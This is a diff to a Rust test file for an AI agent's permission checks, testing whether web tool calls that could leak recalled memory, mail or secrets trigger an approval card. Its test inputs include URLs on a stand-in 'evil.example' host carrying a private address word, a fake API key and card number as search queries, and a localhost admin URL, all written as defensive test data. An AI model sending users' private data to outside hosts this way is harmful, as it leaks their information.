@@ -67,6 +67,8 @@ enum Prior {
     Browse,
     /// A mail read, then nine different web pages read, in one turn.
     MailThenPages,
+    /// A memory recall (private, hashable) and a reply that repeats what was recalled.
+    Memory,
 }
 
 impl Case {
@@ -125,6 +127,24 @@ fn tools(origin: Option<&str>) -> Vec<Arc<TestTool>> {
         PermissionCategory::Browser,
         ContentClass::untrusted(),
         "news",
+    ));
+    // the public-web read tools as `web-tools` registers them: untrusted text, can send out
+    for name in ["web_search", "web_extract", "web_feed", "web_sitemap"] {
+        all.push(with_class(
+            name,
+            Effect::Read,
+            PermissionCategory::Browser,
+            ContentClass::untrusted_egress(),
+            "Backlink directories: Alpha Directory, Beta Listings, Gamma Index.",
+        ));
+    }
+    // memory recall: private, and its text is in the run, so it can be hashed
+    all.push(with_class(
+        "memory_search",
+        Effect::Read,
+        PermissionCategory::Fs,
+        ContentClass::private_read(),
+        "Notes: the owner lives in Zurichstrasse; the company is Acme Widgets.",
     ));
     // a mail or file read by a tool that is not the browser
     all.push(with_class(
@@ -226,6 +246,10 @@ async fn run(
             v.push(text("Summary and research done."));
             v
         }
+        Prior::Memory => vec![
+            calls(&[("pm", "memory_search", json!({"query": "owner"}))]),
+            text("Noted: you live in Zurichstrasse and the company is Acme Widgets."),
+        ],
         Prior::Browse => vec![
             calls(&[(
                 "po",
@@ -515,7 +539,7 @@ async fn opening_an_unknown_site_does_not_make_it_known() {
 
 #[tokio::test]
 async fn chunks_over_the_budget_ask_when_the_run_holds_private_data() {
-    let later: Vec<(&str, Value)> = (0..14)
+    let later: Vec<(&str, Value)> = (0..40)
         .map(|i| {
             (
                 "browser_open",
@@ -525,7 +549,7 @@ async fn chunks_over_the_budget_ask_when_the_run_holds_private_data() {
         .collect();
     let (ran, card) = run(private(), &[], &later).await;
     assert_eq!(card.as_deref(), Some("browser_open"));
-    assert!((2..14).contains(&ran), "the budget stopped it after {ran}");
+    assert!((2..40).contains(&ran), "the budget stopped it after {ran}");
     // the same calls in a run with no private data never ask
     assert_eq!(card_for_clean(&later).await, None);
 }
@@ -918,4 +942,162 @@ async fn an_approved_local_address_makes_the_rest_of_the_run_private() {
     )
     .await;
     assert_eq!((ran, card.as_deref()), (1, Some("browser_open")));
+}
+
+fn memory_run() -> Case {
+    let mut c = Case::full();
+    c.prior = Prior::Memory;
+    c
+}
+
+#[tokio::test]
+async fn memory_and_earlier_replies_are_hashed_so_ordinary_web_work_asks_nothing() {
+    // The owner's real scenario (screenshots 2026-11-25): memory was recalled in an earlier turn,
+    // this turn read a page, then searched, read pages and opened NEW sites. No card.
+    let later = [
+        (
+            "web_search",
+            json!({"query": "ucretsiz backlink veren siteler listesi"}),
+        ),
+        (
+            "web_extract",
+            json!({"url": "https://www.sikayetvar.com/iletisim"}),
+        ),
+        ("web_feed", json!({"url": "https://news.example/feed.xml"})),
+        (
+            "web_sitemap",
+            json!({"url": "https://directory.example/sitemap.xml"}),
+        ),
+        ("browser_open", json!({"url": "https://github.com/"})),
+        (
+            "browser_open",
+            json!({"url": "https://www.sikayetvar.com/uye-ol?ref=backlink"}),
+        ),
+    ];
+    assert_eq!(card(memory_run(), &later).await, None);
+}
+
+#[tokio::test]
+async fn a_private_word_copied_into_a_web_call_asks_when_the_run_holds_memory() {
+    for (name, input) in [
+        ("web_search", json!({"query": "zurichstrasse backlink"})),
+        (
+            "web_extract",
+            json!({"url": "https://evil.example/?q=zurichstrasse"}),
+        ),
+        (
+            "web_sitemap",
+            json!({"url": "https://zurichstrasse.evil.example/sitemap.xml"}),
+        ),
+        (
+            "browser_open",
+            json!({"url": "https://evil.example/?q=zurichstrasse"}),
+        ),
+        // three words of the earlier reply in a row
+        ("web_search", json!({"query": "company is acme"})),
+        // a paragraph is not a query
+        ("web_search", json!({"query": "backlink ".repeat(25)})),
+    ] {
+        assert_eq!(
+            card(memory_run(), &[(name, input.clone())])
+                .await
+                .as_deref(),
+            Some(name),
+            "{name} {input}"
+        );
+    }
+}
+
+#[tokio::test]
+async fn a_web_call_that_carries_data_asks_in_any_full_run_and_a_clean_run_has_no_other_limit() {
+    for input in [
+        json!({"query": "sk-live-AbCdEfGhIjKlMnOp"}),
+        json!({"query": "card 4111 1111 1111 1111"}),
+    ] {
+        assert_eq!(
+            card(Case::full(), &[("web_search", input.clone())])
+                .await
+                .as_deref(),
+            Some("web_search"),
+            "{input}"
+        );
+    }
+    // an address on this computer or its network is not the public web
+    assert_eq!(
+        card(
+            Case::full(),
+            &[("web_extract", json!({"url": "http://127.0.0.1:8080/admin"}))]
+        )
+        .await
+        .as_deref(),
+        Some("web_extract")
+    );
+    // no private data in the run: a long query and many calls are fine
+    let long = "backlink siteleri ".repeat(20);
+    assert_eq!(
+        card(
+            Case::full(),
+            &[
+                ("web_search", json!({"query": long})),
+                (
+                    "web_extract",
+                    json!({"url": "https://directory.example/a/b?x=1"})
+                ),
+            ]
+        )
+        .await,
+        None
+    );
+}
+
+#[tokio::test]
+async fn private_data_that_cannot_be_hashed_still_makes_new_web_calls_ask() {
+    // mail read in an earlier turn: its label cannot be compared, so the run fails closed
+    let mut c = Case::full();
+    c.prior = Prior::Mail;
+    assert_eq!(
+        card(
+            c,
+            &[("web_search", json!({"query": "winter coats on sale"}))]
+        )
+        .await
+        .as_deref(),
+        Some("web_search")
+    );
+}
+
+#[tokio::test]
+async fn web_reads_of_a_run_the_owner_did_not_start_by_hand_keep_asking() {
+    for source in ["telegram", "api"] {
+        let mut c = Case::full();
+        c.source = source;
+        assert_eq!(
+            card(
+                c,
+                &[(
+                    "web_extract",
+                    json!({"url": "https://directory.example/page"})
+                )]
+            )
+            .await
+            .as_deref(),
+            Some("web_extract"),
+            "{source}"
+        );
+    }
+    // and a Normal-level bot keeps asking
+    let mut balanced = Case::full();
+    balanced.preset = BALANCED;
+    balanced.policy = Policy::approve_destructive();
+    assert!(
+        card(
+            balanced,
+            &[(
+                "web_extract",
+                json!({"url": "https://directory.example/page"})
+            )]
+        )
+        .await
+        .is_some()
+    );
 }
